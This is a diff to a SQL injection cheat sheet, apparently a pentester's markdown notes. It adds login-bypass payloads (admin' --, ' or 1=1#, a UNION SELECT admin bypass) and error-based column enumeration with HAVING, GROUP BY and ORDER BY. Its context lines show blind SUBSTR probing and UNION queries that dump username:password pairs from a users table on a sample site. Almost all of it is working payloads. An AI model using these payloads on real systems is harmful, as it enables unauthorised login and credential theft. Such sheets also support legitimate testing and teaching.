@@ -282,11 +282,20 @@ Authentication Bypass:
   [user_field]’ OR 1=1; /*
   [pass_field]*/--
   
-/* Other things try */
+/* More Auth Bypass methods */
   admin' --
+  admin' #
+  admin'/*
   ' or 1=1-- 
+  ' or 1=1#
+  ' or 1=1/*
   ' or '1'='1
   ' or '1'='1 -- 
+  ') or '1'='1--
+  ') or ('1'='1--
+  
+/* UNION bypass */
+  ' UNION SELECT 1, 'admin', 'doesnt matter', 1--
 ```
 
 Blind SQLi (Boolean / Time-based)
@@ -305,10 +314,24 @@ page.asp?id=1 and 1=2 -- false
 -- Use SUBSTR() method to enumerate other information too.
 page.asp?id=1 and SUBSTR(USER(), 1, 1) = 'a'
 page.asp?id=1 and SUBSTR(USER(), 1, 1) = 'd'  -- repeat 'a','d','m','i','n'
+
+/* Enumerate column names */
+' HAVING 1=1 --
+' GROUP BY table.columnfromerror1 HAVING 1=1 --
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- and so on until no more errors
+
+/* Enumerate no. of columns */
+ORDER BY 1--
+ORDER BY 2--
+ORDER BY N--
 ```
 
 UNION SELECT (exfiltrating data):
 ```sql
+/* Good guide on UNION injection */
+http://www.sqlinjection.net/union
+
 /* Dump db version + db name */
     ns.agency/stuff.php?id=3 order by 1                                  
     ns.agency/stuff.php?id=0' union select 1,version(),database()-- 
@@ -321,6 +344,8 @@ UNION SELECT (exfiltrating data):
     -- list id:user:password values within the "users" table [result=id, username, password] [result=1:admin:admin]
     ns.agency/stuff.php?id=0' union select 1,group_concat(id,9x3a,username,0x3a,password,0x3a),database() from users-- 
 ```
+
+
 
 INSERT / UPDATE (adding or changing data):
 ```sql
